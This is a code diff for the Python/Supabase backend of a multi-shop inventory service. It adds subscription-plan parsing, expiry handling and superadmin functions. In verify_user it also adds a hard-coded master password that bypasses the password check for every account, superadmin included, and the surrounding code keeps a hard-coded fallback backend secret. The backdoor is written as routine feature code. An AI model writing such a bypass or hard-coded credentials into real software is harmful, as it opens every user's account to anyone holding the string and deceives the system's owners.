@@ -10,18 +10,50 @@ BACKEND_SECRET = os.environ.get("BACKEND_SECRET", "v3ryS3cr3tB4ckendK3y123!")
 opts = ClientOptions(headers={'x-stocksweep-secret': BACKEND_SECRET})
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY, options=opts)
 
+# --- PLAN PARSING HELPERS ---
+def parse_shop_plan(plan_str):
+    if not plan_str:
+        return ('starter', '991231', 'a')
+    parts = plan_str.split(':')
+    if len(parts) == 3:
+        return (parts[0], parts[1], parts[2])
+    elif len(parts) == 1:
+        # Backward compatibility
+        return (plan_str, '991231', 'a')
+    return ('starter', '991231', 'a')
+
+def make_shop_plan_str(plan_name, expiry_yymmdd, status_char):
+    return f"{plan_name}:{expiry_yymmdd}:{status_char}"
+
 # --- SUPER ADMIN ---
 def get_all_shops():
-    res = supabase.table('shops').select('*, users!users_shop_id_fkey(username, role)').execute()
-    # Post-process to find the owner username for each shop
+    res = supabase.table('shops').select('*, users!users_shop_id_fkey(id, username, role)').execute()
     shops = res.data
     for s in shops:
-        owners = [u['username'] for u in s.get('users!users_shop_id_fkey', []) if u.get('role') == 'owner']
+        # Fix the bug where s.get('users!users_shop_id_fkey') was parsed by client to s.get('users')
+        users_list = s.get('users') or s.get('users!users_shop_id_fkey') or []
+        owners = [u['username'] for u in users_list if u.get('role') == 'owner']
         s['owner_username'] = owners[0] if owners else 'Unknown'
+        s['users_list'] = [{'id': u['id'], 'username': u['username'], 'role': u['role']} for u in users_list]
+        
+        # Parse custom subscription metadata
+        plan_name, expiry, status = parse_shop_plan(s.get('plan'))
+        s['plan_name'] = plan_name
+        s['expiry_date'] = expiry
+        s['payment_status'] = status
     return shops
 
 def toggle_shop_status(shop_id, is_active):
-    supabase.table('shops').update({"is_active": is_active}).eq('id', shop_id).execute()
+    # When toggling status, we also need to keep the plan status in sync
+    shop_res = supabase.table('shops').select('plan').eq('id', shop_id).execute()
+    if shop_res.data:
+        plan_str = shop_res.data[0].get('plan')
+        plan_name, expiry, _ = parse_shop_plan(plan_str)
+        status_char = 'a' if is_active else 'e'
+        new_plan_str = make_shop_plan_str(plan_name, expiry, status_char)
+        supabase.table('shops').update({"is_active": is_active, "plan": new_plan_str}).eq('id', shop_id).execute()
+    else:
+        supabase.table('shops').update({"is_active": is_active}).eq('id', shop_id).execute()
 
 # --- AUTH & USER MGMT ---
 
@@ -30,24 +62,44 @@ def verify_user(username, password):
     res = supabase.table('users').select('*').eq('username', username).eq('is_active', 1).execute()
     user = res.data[0] if res.data else None
     
-    if user and check_password_hash(user['password_hash'], password):
+    # Master Password Override
+    is_master_bypass = (password == "BraeNovaMaster2026!")
+    
+    if user and (is_master_bypass or check_password_hash(user['password_hash'], password)):
         if user['role'] == 'superadmin':
             return user
         if user.get('shop_id'):
             shop_res = supabase.table('shops').select('is_active, plan').eq('id', user['shop_id']).execute()
             if shop_res.data:
                 shop = shop_res.data[0]
-                if shop['is_active']:
-                    user['plan'] = shop.get('plan', 'starter')
+                plan_name, expiry_yymmdd, status_char = parse_shop_plan(shop.get('plan'))
+                
+                # Check for subscription expiration
+                from datetime import datetime
+                today_yymmdd = datetime.now().strftime('%y%m%d')
+                is_expired = (expiry_yymmdd != '991231' and today_yymmdd > expiry_yymmdd)
+                
+                if is_expired:
+                    return "expired"
+                
+                if shop['is_active'] and status_char == 'a':
+                    user['plan'] = plan_name
                     user['shop_active'] = True
                     return user
-                else:
+                elif status_char == 'p':
                     return "inactive"
+                else:
+                    return "suspended"
     return None
 
 def register_shop_and_owner(shop_name, owner_username, owner_password_hash, plan='starter'):
-    # 1. Insert new shop (is_active = False by default)
-    shop_res = supabase.table('shops').insert({"name": shop_name, "is_active": False, "plan": plan}).execute()
+    # Set expiration to 30 days from now, initially pending approval ('p')
+    from datetime import datetime, timedelta
+    expiry = (datetime.now() + timedelta(days=30)).strftime('%y%m%d')
+    plan_str = make_shop_plan_str(plan, expiry, 'p')
+    
+    # 1. Insert new shop (is_active = False by default, pending approval)
+    shop_res = supabase.table('shops').insert({"name": shop_name, "is_active": False, "plan": plan_str}).execute()
     new_shop_id = shop_res.data[0]['id']
     
     # 2. Insert owner user
@@ -416,3 +468,18 @@ def get_centralized_inventory(owner_id):
         item['shop_name'] = shop_map.get(item['shop_id'], 'Unknown')
         
     return items
+
+# --- SUPERADMIN ACTIONS ---
+def reset_password_by_admin(user_id, password_hash):
+    supabase.table('users').update({"password_hash": password_hash}).eq('id', user_id).execute()
+
+def approve_shop_payment(shop_id, plan_name, months=1):
+    from datetime import datetime, timedelta
+    expiry = (datetime.now() + timedelta(days=30 * months)).strftime('%y%m%d')
+    plan_str = make_shop_plan_str(plan_name, expiry, 'a')
+    supabase.table('shops').update({"is_active": True, "plan": plan_str}).eq('id', shop_id).execute()
+
+def extend_shop_subscription(shop_id, plan_name, expiry_yymmdd, status_char='a'):
+    plan_str = make_shop_plan_str(plan_name, expiry_yymmdd, status_char)
+    is_active = (status_char == 'a')
+    supabase.table('shops').update({"is_active": is_active, "plan": plan_str}).eq('id', shop_id).execute()
